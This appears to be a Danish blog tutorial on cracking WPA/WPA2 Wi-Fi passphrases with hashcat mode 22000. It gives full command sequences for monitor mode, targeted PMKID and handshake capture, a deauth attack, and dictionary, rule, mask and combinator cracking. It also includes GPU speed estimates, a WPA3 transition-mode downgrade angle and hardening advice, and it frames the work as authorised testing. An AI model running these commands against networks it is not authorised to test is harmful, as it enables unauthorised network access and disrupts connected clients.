+++
title = "Sådan cracker du Wi-Fi med hashcat i 2026"
date = 2026-07-03
slug = "crack-wifi-med-hashcat-2026"
description = "En praktisk, opdateret gennemgang af at cracke et WPA/WPA2-håndtryk med hashcat 7.1.2: capture med hcxdumptool, konvertering til hash mode 22000, og dictionary-, regel- og maskeangreb. Inkluderer realistiske GPU-hastigheder og hvorfor WPA3-SAE stopper det hele."

[taxonomies]
tags = ["hashcat", "wifi", "wpa2", "wpa3", "pmkid", "hcxdumptool", "password-cracking", "netvaerkssikkerhed", "sikkerhed"]

[extra]
summary = "airodump-ng + cap2hccapx-workflowet er dødt; hcxdumptool + hashcat mode 22000 er den nuværende standard. Denne gennemgang capturer en PMKID og fuldt 4-vejs håndtryk, konverterer til det samlede hc22000-format, og kører dictionary-, regel- og maskeangreb mod det — med rigtig hashcat 7.1.2-syntaks og 2026-tidens GPU-hastigheder. Slutter med hvorfor intet af dette rører et korrekt konfigureret WPA3-SAE-netværk."
faq = [
  { q = "Skal jeg deautentificere klienter for at capture et håndtryk i 2026?", a = "Sjældnere end du plejede. hcxdumptool capturer PMKID'en opportunistisk fra de fleste access points med en enkelt ukrypteret frame — ingen klient-association eller deauth nødvendig overhovedet. Deauth er nu et fallback for den mindre andel af APs, der ikke lækker en PMKID og i stedet kræver et fuldt 4-vejs håndtryk." },
  { q = "Hvad er forskellen på hashcat mode 22000 og de gamle modes 2500/16800?", a = "Mode 2500 (EAPOL) og 16800 (PMKID) er legacy, opdelte formater knyttet til det gamle hccapx-filformat. Mode 22000 (WPA-PBKDF2-PMKID+EAPOL) er det nuværende samlede format produceret af hcxpcapngtool — det håndterer både PMKID- og fuldt-håndtryk-captures i én fil og ét hashcat-kald, og er det nuværende tutorials og hcxtools sigter mod." },
  { q = "Kan hashcat cracke WPA3?", a = "Ikke via offline dictionary-angreb mod et korrekt konfigureret WPA3-Personal-netværk. WPA3 erstatter det PSK-afledte håndtryk med SAE (Simultaneous Authentication of Equals), som ikke lækker et crackbart hash til en passiv observatør — det er hele pointen med protokollen. Den eneste praktiske vinkel mod WPA3 er at tvinge et downgrade på et access point, der stadig kører WPA2/3-overgangstilstand, og derefter angribe WPA2-siden." },
  { q = "Hvor hurtigt kan et moderne GPU cracke et WPA-håndtryk?", a = "Mode 22000 bruger PBKDF2 med 4096 iterationer pr. kandidat, hvilket er bevidst dyrt. Et enkelt RTX 5090-klasse-GPU klarer omkring 5–8 millioner kandidater/sekund i 2026 — nok til at udtømme rockyou.txt (14,3M linjer) på under 3 sekunder, men en tilfældig 12+-tegns PSK forbliver beregningsmæssigt uden for rækkevidde i årtusinder." },
  { q = "Er dette lovligt?", a = "Kun mod netværk du ejer eller har eksplicit skriftlig tilladelse til at teste. At capture og forsøge at cracke et håndtryk fra et netværk, du ikke kontrollerer, er uautoriseret adgang under de fleste lovgivninger om datakriminalitet, uanset hvor triviel teknikken er." }
]
+++

**Kort fortalt —** `airodump-ng` + `aircrack-ng` + `cap2hccapx`-pipelinen, som hver eneste tutorial fra 2015 lærer dig, er forældet. Den nuværende workflow er **`hcxdumptool`** til capture, **`hcxpcapngtool`** til at konvertere til det samlede **hash mode 22000**-format, og **`hashcat 7.1.2`** til at angribe det. Dette indlæg gennemgår hele kæden mod et WPA2-netværk, du har tilladelse til at teste, med rigtige kommandoer, realistiske 2026-GPU-hastigheder, og et ærligt svar på hvorfor intet af det virker mod WPA3-SAE.

Test kun netværk du ejer eller har eksplicit skriftlig tilladelse til at teste. Se [25 år med Wi-Fi-sikkerhed](/da/post/hack-traadloest-netvaerk/) for den bredere historie og forsvarsvejledning, denne gennemgang supplerer.

## Hvad der har ændret sig siden de gamle tutorials

Hvis du lærte dette fra en gammel guide, er tre ting anderledes nu:

1. **`hcxdumptool`/`hcxtools` erstattede `airodump-ng` + `cap2hccapx`** til capture og konvertering. `aircrack-ng` er stadig fint til at sætte et kort i monitor mode, men dets eget `.cap`-captureformat og community-konverteren `cap2hccapx` er legacy — de producerer kun de gamle, mere begrænsede hash modes.
2. **Hash mode 22000 erstattede modes 2500 og 16800.** hashcat har nu ét samlet format (`WPA-PBKDF2-PMKID+EAPOL`), der håndterer både et PMKID-capture og et fuldt 4-vejs håndtryk-capture i samme fil.
3. **PMKID først, deauth valgfrit.** De fleste forbruger-APs lækker en PMKID i en enkelt frame med nul klient-interaktion — ingen deautentificering af nogen nødvendig. Deauth er nu et fallback, ikke standard-førstetrækket.

## Krav

- En trådløs adapter der understøtter **monitor mode og packet injection** (Atheros AR9271 og Realtek RTL8812AU-chipsæt forbliver pålidelige valg i 2026).
- **hashcat 7.1.2** eller nyere. `hashcat -V` for at tjekke; projektet bevæger sig hurtigt, opdatér hvis du er bagud.
- **hcxdumptool + hcxtools** (ZerBeas værktøjer) — `apt install hcxdumptool hcxtools` på Debian/Kali, eller byg fra kilde.
- En ordliste. Se [rockyou.txt og ordlisternes nuværende tilstand](/da/post/rockyou-ordliste-historie/) — start småt (`rockyou-65.txt`), ikke med en 100 GB megaliste.
- En GPU. hashcat kører også på CPU, men WPA's PBKDF2-omkostningsfunktion er designet til at være langsom — en GPU er ikke valgfri, hvis du vil have resultater på rimelig tid.

## Trin 1 — monitor mode

```bash
sudo airmon-ng check kill      # stop NetworkManager/wpa_supplicant der kæmper om interfacet
sudo airmon-ng start wlan0     # opretter wlan0mon i monitor mode
```

Eller uden aircrack-ng-pakken, med `iw` direkte:

```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

## Trin 2 — capture med hcxdumptool

Det opportunistiske capture uden deauth — indsamler PMKID'er og håndtryk fra alt inden for rækkevidde:

```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

For at målrette et specifikt BSSID og reducere støj, byg en filterliste og send den ind:

```bash
echo "AA:BB:CC:DD:EE:FF" > targets.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist=targets.txt --filtermode=2 --enable_status=1
```

Hvis mål-AP'en ikke lækker en PMKID, og du har brug for et fuldt 4-vejs håndtryk fra en tilsluttende klient, tving en genforbindelse med et klassisk deauth (kræver tilladelse — dette påvirker klientens forbindelse):

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

Lad `hcxdumptool` blive ved med at køre i en anden terminal, mens du gør dette — det capturer automatisk det resulterende håndtryk.

## Trin 3 — konvertér til hash mode 22000

```bash
hcxpcapngtool -o hash.22000 capture.pcapng
```

Denne ene kommando udtrækker hver crackbar PMKID og EAPOL-håndtryk fundet i capturet til hashcat's samlede format. Hvis du capturede flere netværk og vil isolere ét, filtrér den resulterende fil på BSSID (det andet felt i hver linje):

```bash
grep "aabbccddeeff" hash.22000 > target-only.22000
```

## Trin 4 — angrib det

### Dictionary-angreb

```bash
hashcat -m 22000 -a 0 hash.22000 rockyou-65.txt
```

Start med en lille, kurateret liste, ikke den fulde 14,3M-linjers `rockyou.txt` — se [ordliste-indlægget](/da/post/rockyou-ordliste-historie/) for hvorfor det nu er det bedre standardvalg.

### Regelbaseret angreb

Regler genererer muterede kandidater (case-skift, leetspeak, tilføjede cifre) fra en lille basisliste — normalt langt mere effektivt pr. sekund GPU-tid end en større umuteret liste:

```bash
hashcat -m 22000 -a 0 -r rules/best64.rule hash.22000 rockyou-65.txt
```

### Maskeangreb

Nyttigt når du ved noget om PSK'ens struktur — et almindeligt standard-router-mønster (8 cifre), en PSK der ligner et telefonnummer, eller en kendt længde:

```bash
hashcat -m 22000 -a 3 hash.22000 ?d?d?d?d?d?d?d?d
```

### Combinator-angreb

Sammenkæder to ordlister — nyttigt til `ord+ord`- eller `ord+tal`-PSK-mønstre:

```bash
hashcat -m 22000 -a 1 hash.22000 words.txt suffixes.txt
```

### Tjek resultater

```bash
hashcat -m 22000 hash.22000 --show
```

## Realistiske hastigheder i 2026

Mode 22000 kører PSK'en gennem **PBKDF2-HMAC-SHA1 med 4096 iterationer** — dette er med vilje, for at gøre brute-force dyrt. Det er langt fra så hurtigt som et rå hash mode som NTLM eller SHA-1.

| GPU-klasse | Kandidater/sekund (mode 22000) | `rockyou.txt` (14,3M) udtømt på |
|---|---:|---:|
| RTX 3090 (2022-æraen) | ~1,2M/s | ~12 s |
| RTX 4090 | ~2,5–3M/s | ~5 s |
| RTX 5090-klasse (2025+) | ~5–8M/s | ~2–3 s |
| 8× H100 cloud-instans | ~50M/s samlet | <0,3 s |

Mod en **tilfældig 12+-tegns PSK** (entropi ≈ 2⁷²) betyder ingen af disse tal noget — udtømmende søgning tager stadig årtusinder. Mod en **8-tegns ordbogsord-PSK** betyder de alle sammen en hel del.

## Hvorfor dette ikke rører WPA3

Alt ovenfor målretter **WPA2's PSK-afledte 4-vejs håndtryk**, som med vilje lader en offline observatør verificere PSK-gæt mod et capturet hash. **WPA3-Personal erstatter dette med SAE** (Simultaneous Authentication of Equals) — en protokol specifikt bygget så et passivt capture ikke giver noget crackbart offline. Der findes ikke et hashcat-mode til "cracke WPA3-SAE offline", fordi protokollen ikke lækker det materiale, der skal til for at prøve.

Den praktiske vinkel mod WPA3 i 2026 er ikke at cracke SAE — det er at finde et access point, der stadig annoncerer **WPA2/3-overgangstilstand**, tvinge klienten til at forhandle WPA2-siden, og køre præcis angrebet ovenfor mod det fallback. Hvis netværket er rent WPA3 med PMF (Protected Management Frames) påkrævet, har denne playbook intet at byde på. Se [25 år med Wi-Fi-sikkerhed](/da/post/hack-traadloest-netvaerk/) for det fulde billede, inklusive Dragonblood-downgrade-forskningen dette afhænger af.

## Defensiv pointe

Hvis du læser dette for at tjekke dit eget netværk:

- **WPA3-Personal, ingen overgangstilstand.** Tjek eksplicit — mange APs falder tilbage på WPA2/3-blandet tilstand, selv når WPA3 er "aktiveret".
- **En lang, tilfældig PSK** — 20+ tegn, ikke et ordbogsord eller telefonnummer. Det er det, der faktisk stopper hvert eneste angreb ovenfor koldt, WPA2 eller WPA3.
- **Deaktivér WPS.** Urelateret til hashcat, men stadig ofte efterladt tændt og stadig en langt hurtigere vej ind for en angriber.
- **PMF påkrævet, ikke valgfrit**, for helt at lukke af for deauth-drevet håndtryk-capture.

> Se også [rockyou.txt og ordlisternes tilstand i 2026](/da/post/rockyou-ordliste-historie/) for hvad du faktisk skal loade ind i `-a 0`, og [25 år med Wi-Fi-sikkerhed](/da/post/hack-traadloest-netvaerk/) for protokolhistorien bag alt dette.
